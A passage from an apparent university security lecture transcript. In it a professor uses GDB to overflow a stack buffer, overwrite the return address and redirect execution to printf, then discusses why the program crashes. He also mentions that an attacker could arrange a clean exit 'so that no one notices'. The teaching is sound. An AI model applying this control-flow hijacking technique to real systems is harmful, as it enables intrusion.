            </slice>
            <slice>
              <time_slice>1:00:03</time_slice>
              <text_slice>Dollar sign, EBP.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:05</time_slice>
              <text_slice>So in fact, yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:06</time_slice>
              <text_slice>It's all 0x41, which is the
ASCII encoding of the letter A.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:12</time_slice>
              <text_slice>And in fact, the return
address is probably going</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:14</time_slice>
              <text_slice>to be the same way, right?</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:15</time_slice>
              <text_slice>If we print the return
address, it's also all As.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:19</time_slice>
              <text_slice>That's not so great.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:20</time_slice>
              <text_slice>In fact, what's going to
happen if we return now is</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:22</time_slice>
              <text_slice>the program will jump to
that address, 41414141.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:25</time_slice>
              <text_slice>And there's nothing there.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:26</time_slice>
              <text_slice>And it'll crash.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:27</time_slice>
              <text_slice>That's the segmentation
fault you're getting.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:29</time_slice>
              <text_slice>So let's just step up to
it and see what happens.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:33</time_slice>
              <text_slice>So let's run next.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:34</time_slice>
              <text_slice>So we keep stepping
through the program.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:37</time_slice>
              <text_slice>And we can see where we are.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:40</time_slice>
              <text_slice>OK.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:40</time_slice>
              <text_slice>We're getting close to
the end of the function.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:43</time_slice>
              <text_slice>So we can step over
two more instructions.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:46</time_slice>
              <text_slice>nexti.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:49</time_slice>
              <text_slice>And now we can
disassemble again.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:51</time_slice>
              <text_slice>OK.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:52</time_slice>
              <text_slice>We're now just at the return
instruction from this function.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:54</time_slice>
              <text_slice>And we can actually figure out.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:56</time_slice>
              <text_slice>So as you can see, at
the end of the function,</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:59</time_slice>
              <text_slice>it runs this leave
x86 instruction,</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:02</time_slice>
              <text_slice>which basically restores the
stack back to where it was.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:05</time_slice>
              <text_slice>So it sort of pushes
the stack pointer</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:07</time_slice>
              <text_slice>all the way back to the return
address using the same EBP.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:10</time_slice>
              <text_slice>That's what it's basically for.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:11</time_slice>
              <text_slice>And now, the stack is
pointing at the return address</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:15</time_slice>
              <text_slice>that we're going to use.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:16</time_slice>
              <text_slice>And in fact, it's all A's.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:18</time_slice>
              <text_slice>And if we run one
more instruction,</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:20</time_slice>
              <text_slice>the CPU is going to jump to
that exact memory address</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:22</time_slice>
              <text_slice>and start executing
code there and crash,</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:25</time_slice>
              <text_slice>because it's not a valid address
that's in the page table.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:29</time_slice>
              <text_slice>So let's actually see, just to
double check, what's going on.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:32</time_slice>
              <text_slice>Let's print our buffer again.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:34</time_slice>
              <text_slice>Our buffer-- well, that's
actually kind of interesting,</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:36</time_slice>
              <text_slice>right?</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:37</time_slice>
              <text_slice>So now, buffer,
for some reason it</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:38</time_slice>
              <text_slice>only says A repeats 128 times.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:41</time_slice>
              <text_slice>Whereas if you remember before,
it said A repeated 180 times</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:45</time_slice>
              <text_slice>in our buffer.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:47</time_slice>
              <text_slice>So what happened?</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:49</time_slice>
              <text_slice>Yeah?</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:49</time_slice>
              <text_slice>AUDIENCE: [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:51</time_slice>
              <text_slice>PROFESSOR: Yeah, yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:51</time_slice>
              <text_slice>Exactly.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:52</time_slice>
              <text_slice>So there's actually
something going on</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:53</time_slice>
              <text_slice>after the buffer
overflow happens</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:55</time_slice>
              <text_slice>that changes what's going on.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:56</time_slice>
              <text_slice>So actually, if
you remember, we do</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:58</time_slice>
              <text_slice>this A to i conversion of
the string to an integer.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:00</time_slice>
              <text_slice>And if you provide
all As, it actually</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:03</time_slice>
              <text_slice>writes zero to this
memory location.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:05</time_slice>
              <text_slice>So a zero, if you remember,
terminates strings in C.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:08</time_slice>
              <text_slice>So GDB now thinks, yep, we have
a perfectly well-terminated</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:12</time_slice>
              <text_slice>128 byte string of all As.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:15</time_slice>
              <text_slice>But you know, it
doesn't really matter,</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:16</time_slice>
              <text_slice>because we still have
those As up top that</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:18</time_slice>
              <text_slice>already corrupted our stack.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:21</time_slice>
              <text_slice>OK.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:21</time_slice>
              <text_slice>That was actually kind
of an important lesson</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:23</time_slice>
              <text_slice>that-- it's actually a
little bit tricky, sometimes,</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:25</time_slice>
              <text_slice>to explore these buffer
overflows because, even</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:28</time_slice>
              <text_slice>though you've already changed
lots of stuff on the stack,</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:31</time_slice>
              <text_slice>you still have to
get to the point</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:32</time_slice>
              <text_slice>where you use the value
that you have somehow</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:34</time_slice>
              <text_slice>placed on the stack.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:35</time_slice>
              <text_slice>So there's other
code that's going</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:37</time_slice>
              <text_slice>to run after you've
managed to overflow</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:38</time_slice>
              <text_slice>some buffer and corrupt memory.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:40</time_slice>
              <text_slice>You have to make sure that
code doesn't do something silly</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:42</time_slice>
              <text_slice>like, if it's A to i,
just exited right away,</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:45</time_slice>
              <text_slice>as soon as it saw a
non-integer value,</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:48</time_slice>
              <text_slice>we might not get to jump to
all this 41414141 address.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:53</time_slice>
              <text_slice>So you have to massage
your input in some cases.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:55</time_slice>
              <text_slice>Maybe not so much in this case.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:56</time_slice>
              <text_slice>But in other
situations, you'll have</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:58</time_slice>
              <text_slice>to be careful in
constructing this input.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:01</time_slice>
              <text_slice>OK, so just to see what happens,
we can jump one more time.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:04</time_slice>
              <text_slice>Well, let's look
at our register.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:06</time_slice>
              <text_slice>So right now, our EIP, the
sort of instruction pointer,</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:10</time_slice>
              <text_slice>is pointing at the
last thing in redirect.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:12</time_slice>
              <text_slice>And if we step one more
time, hopefully we'll</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:14</time_slice>
              <text_slice>jump to, finally, that
unfortunate 4141 address.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:19</time_slice>
              <text_slice>Over here.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:20</time_slice>
              <text_slice>And in fact, yep.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:20</time_slice>
              <text_slice>The program now seems
to be executing there.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:22</time_slice>
              <text_slice>If we ask GDB to print the
current set of registers,</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:25</time_slice>
              <text_slice>yep, the current instruction
pointer is this strange value.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:29</time_slice>
              <text_slice>And if we exclude
one more instruction,</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:31</time_slice>
              <text_slice>it's going to crash
because that's finally</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:34</time_slice>
              <text_slice>trying to execute an instruction
pointer that doesn't correspond</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:39</time_slice>
              <text_slice>to a valid page in the
operating system's page table</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:42</time_slice>
              <text_slice>for this process.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:44</time_slice>
              <text_slice>Make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:46</time_slice>
              <text_slice>Any questions?</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:49</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:49</time_slice>
              <text_slice>Well, I've got a question
for you guys, actually.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:52</time_slice>
              <text_slice>So what happens-- you know,
it seems to be exploitable.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:58</time_slice>
              <text_slice>Or well, OK.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:59</time_slice>
              <text_slice>Maybe let's first figure out
why this is particularly bad,</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:02</time_slice>
              <text_slice>right?</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:02</time_slice>
              <text_slice>So why is it a problem?</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:03</time_slice>
              <text_slice>So not only does
our program crash,</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:05</time_slice>
              <text_slice>but presumably we're
going to take it over.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:07</time_slice>
              <text_slice>So I guess, first
simple question is, OK,</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:09</time_slice>
              <text_slice>so what's the problem?</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:10</time_slice>
              <text_slice>What can you do?</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:11</time_slice>
              <text_slice>Yeah?</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:11</time_slice>
              <text_slice>AUDIENCE: You can do
whatever you want.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:13</time_slice>
              <text_slice>PROFESSOR: Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:13</time_slice>
              <text_slice>So I was actually pretty silly
and just put in lots of As.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:16</time_slice>
              <text_slice>But if you were
careful about knowing</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:18</time_slice>
              <text_slice>where to put what
values, you might</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:20</time_slice>
              <text_slice>be able to put in
a different value</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:21</time_slice>
              <text_slice>and get it to jump
somewhere else.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:23</time_slice>
              <text_slice>So let's see if we can
actually do this, right?</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:25</time_slice>
              <text_slice>We can retrace this whole thing.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:26</time_slice>
              <text_slice>OK.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:27</time_slice>
              <text_slice>Re-run the program again.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:28</time_slice>
              <text_slice>And I guess I have to
reset the breakpoint.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:33</time_slice>
              <text_slice>So I can break and
redirect again.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:35</time_slice>
              <text_slice>And run.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:36</time_slice>
              <text_slice>And this time,
I'll, again, next,</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:42</time_slice>
              <text_slice>supply lots of As
and overflow things.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:43</time_slice>
              <text_slice>But I'm not going to try
to carefully construct--</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:47</time_slice>
              <text_slice>you know, figure out which
point in these As corresponds</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:50</time_slice>
              <text_slice>to the location in the stack.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:51</time_slice>
              <text_slice>That's something
you guys are going</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:52</time_slice>
              <text_slice>to have to do for lab one.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:53</time_slice>
              <text_slice>But suppose that I
overflow the stack here.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:57</time_slice>
              <text_slice>And then I'm going
to manually try</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:58</time_slice>
              <text_slice>to change things on the stack to
get it to jump to some point I</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:01</time_slice>
              <text_slice>want to jump to.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:03</time_slice>
              <text_slice>And in this program, OK,
so let's again-- nexti.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:08</time_slice>
              <text_slice>Where are we?</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:09</time_slice>
              <text_slice>We're at, again, at the
very end of redirect.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:12</time_slice>
              <text_slice>And let's actually look
at the stack, right?</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:14</time_slice>
              <text_slice>So if we examine esp here,
we see our corrupted pointer.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:18</time_slice>
              <text_slice>OK.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:18</time_slice>
              <text_slice>Where could we jump to?</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:21</time_slice>
              <text_slice>What interesting
things could we do?</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:22</time_slice>
              <text_slice>Unfortunately, this
program is pretty limited.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:24</time_slice>
              <text_slice>There's almost nothing
in the program's code</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:26</time_slice>
              <text_slice>where you could jump and
do anything interesting.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:28</time_slice>
              <text_slice>But maybe we can do a little
bit of something interesting.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:31</time_slice>
              <text_slice>Maybe we'll find
the printf in main</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:33</time_slice>
              <text_slice>and jump directly there, and
get it to print the x value,</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:36</time_slice>
              <text_slice>or x equals something.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:37</time_slice>
              <text_slice>So we can do this.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:38</time_slice>
              <text_slice>We can actually disassemble
the main function.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:41</time_slice>
              <text_slice>And main does a
bunch of stuff, you</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:44</time_slice>
              <text_slice>know, initializes, calls
redirect, does some more stuff,</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:47</time_slice>
              <text_slice>and then calls printf.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:49</time_slice>
              <text_slice>So how about we jump to
this point, which is,</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:51</time_slice>
              <text_slice>it sets up the
argument to printf,</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:54</time_slice>
              <text_slice>which is x equals percent d,
and then actually calls printf.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:58</time_slice>
              <text_slice>So we can actually
take this value</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:59</time_slice>
              <text_slice>and try to stick
it in the stack.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:01</time_slice>
              <text_slice>And should be able to do
this with the debugger</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:05</time_slice>
              <text_slice>pretty easily, at least.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:06</time_slice>
              <text_slice>So you can do this set
[? int ?] esp equals this value.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:11</time_slice>
              <text_slice>So we can examine esp again
and, indeed, it actually</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:14</time_slice>
              <text_slice>has this value.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:14</time_slice>
              <text_slice>So if we continue now,
well, it printed out x</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:19</time_slice>
              <text_slice>equals some garbage,
which I guess</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:21</time_slice>
              <text_slice>happens to be just whatever
is on the stack that</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:24</time_slice>
              <text_slice>was passed to printf.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:25</time_slice>
              <text_slice>We didn't correctly set
up all the arguments</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:26</time_slice>
              <text_slice>because we jumped in the middle
of this calling sequence.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:29</time_slice>
              <text_slice>But yeah, we printed this value.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:30</time_slice>
              <text_slice>And then it crashed.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:32</time_slice>
              <text_slice>Why did crash?</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:33</time_slice>
              <text_slice>Why do you think?</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:36</time_slice>
              <text_slice>What actually happens, right?</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:37</time_slice>
              <text_slice>So we jump to printf.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:40</time_slice>
              <text_slice>And then, something went wrong.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:42</time_slice>
              <text_slice>Yeah?</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:45</time_slice>
              <text_slice>Well, we changed
the return address</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:47</time_slice>
              <text_slice>so that when we
return from redirect,</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:48</time_slice>
              <text_slice>we now jump to this new address,
which is that point up there,</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:52</time_slice>
              <text_slice>right after printf.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:53</time_slice>
              <text_slice>So where's this
crash coming from?</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:58</time_slice>
              <text_slice>Yeah?</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:59</time_slice>
              <text_slice>AUDIENCE: Is it
restricted because your i</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:01</time_slice>
              <text_slice>is supposed to be some
sort of integer, but--</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:02</time_slice>
              <text_slice>PROFESSOR: No, actually,
well the i is like,</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:04</time_slice>
              <text_slice>well it's a 32-bit register.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:05</time_slice>
              <text_slice>So whatever's in the
register, it'll print.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:06</time_slice>
              <text_slice>In fact, that's the thing
that's in the register.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:08</time_slice>
              <text_slice>So that's OK.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:10</time_slice>
              <text_slice>Yeah?</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:11</time_slice>
              <text_slice>AUDIENCE: [INAUDIBLE]
main returns.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:12</time_slice>
              <text_slice>PROFESSOR: Yes.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:12</time_slice>
              <text_slice>Actually, yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:13</time_slice>
              <text_slice>What's going on is, you
have to sort of-- OK,</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:15</time_slice>
              <text_slice>so this is the point
where we jumped.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:17</time_slice>
              <text_slice>It's set up some arguments.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:18</time_slice>
              <text_slice>It actually calls printf.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:20</time_slice>
              <text_slice>printf seems to work.
printf is going to return.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:22</time_slice>
              <text_slice>Now actually, that's fine,
because this call instruction</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:24</time_slice>
              <text_slice>put a return address on the
stack for printf to use.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:26</time_slice>
              <text_slice>That's fine.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:27</time_slice>
              <text_slice>Then main is going
to continue running.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:29</time_slice>
              <text_slice>It's going to run the sleeve
instruction, which doesn't</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:31</time_slice>
              <text_slice>do anything interesting.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:32</time_slice>
              <text_slice>And then it does another return.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:34</time_slice>
              <text_slice>But the thing in
this-- up to the stack,</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:36</time_slice>
              <text_slice>it doesn't actually have
a valid return address.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:38</time_slice>
              <text_slice>So presumably, we
return to some other</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:40</time_slice>
              <text_slice>who knows what memory location
that's up on the stack</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:42</time_slice>
              <text_slice>and jump somewhere else.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:44</time_slice>
              <text_slice>So unfortunately,
here, our pseudoattack</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:48</time_slice>
              <text_slice>didn't really work.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:48</time_slice>
              <text_slice>It ran some code.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:49</time_slice>
              <text_slice>But then it crashed.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:51</time_slice>
              <text_slice>That's probably not
something you want to do.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:52</time_slice>
              <text_slice>So if you really
wanted to be careful,</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:53</time_slice>
              <text_slice>you would carefully plant not
just this return address up</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:56</time_slice>
              <text_slice>on the stack, but
maybe you'd figure out,</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:58</time_slice>
              <text_slice>where is this second red going
to get its return address from,</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:02</time_slice>
              <text_slice>and try to carefully
place something</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:03</time_slice>
              <text_slice>else on the stack
there that will ensure</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:06</time_slice>
              <text_slice>that your program cleanly
exits after it gets exploited</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:08</time_slice>
              <text_slice>so that no one notices.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:10</time_slice>
              <text_slice>So this is all
stuff you'll sort of</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:12</time_slice>
              <text_slice>try to do in lab one in
a little bit more detail.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:15</time_slice>
              <text_slice>But I guess one thing we
can try to think about now</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:20</time_slice>
              <text_slice>is, we sort of understand
why it's bad to jump to the--</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:24</time_slice>
              <text_slice>or to have these
buffer overflows.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:31</time_slice>
              <text_slice>One problem, or one sort
of way to think of this</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:33</time_slice>
              <text_slice>is that, the problem is just
because the return address is</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:35</time_slice>
              <text_slice>up there, right?</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:36</time_slice>
              <text_slice>So the buffer keeps
growing and eventually runs</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:38</time_slice>
              <text_slice>over the return address.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:41</time_slice>
              <text_slice>What if we flip
the stack around?</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:43</time_slice>
              <text_slice>You know, some machines actually
have stacks that grow up.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:47</time_slice>
              <text_slice>So an alternative design
we could sort of imagine</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:51</time_slice>
              <text_slice>is one where the stack
starts at the bottom</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:55</time_slice>
              <text_slice>and keeps going up
instead of going down.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:58</time_slice>
              <text_slice>So then, if you
overflow this buffer,</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:01</time_slice>
              <text_slice>you'll just keep
going up on the stack,</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:02</time_slice>
              <text_slice>and maybe there's nothing
bad that will happen.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:06</time_slice>
              <text_slice>Yeah?</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:07</time_slice>
              <text_slice>AUDIENCE: [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:10</time_slice>
              <text_slice>PROFESSOR: So you're right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:11</time_slice>
              <text_slice>It might be that,
if you have-- well,</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:14</time_slice>
              <text_slice>so let me draw this
new stack diagram.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:16</time_slice>
              <text_slice>And we'll sort of try to figure
out what it applies to and not.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:20</time_slice>
              <text_slice>But OK.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:20</time_slice>
              <text_slice>So we'll basically just
invert the picture.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:22</time_slice>
              <text_slice>So when you call redirect on
this alternative architecture,</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:25</time_slice>
              <text_slice>what's going to happen
is the return address</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:27</time_slice>
              <text_slice>is going to go
here on the stack.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:31</time_slice>
              <text_slice>Then we'll have our i variable,
or maybe the saved EBP.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:36</time_slice>
              <text_slice>Then we'll have our i variable.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:38</time_slice>
              <text_slice>And then we'll have buff.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:39</time_slice>
              <text_slice>So we'll have buff of zero,
buff 127, and so on, right?</text_slice>
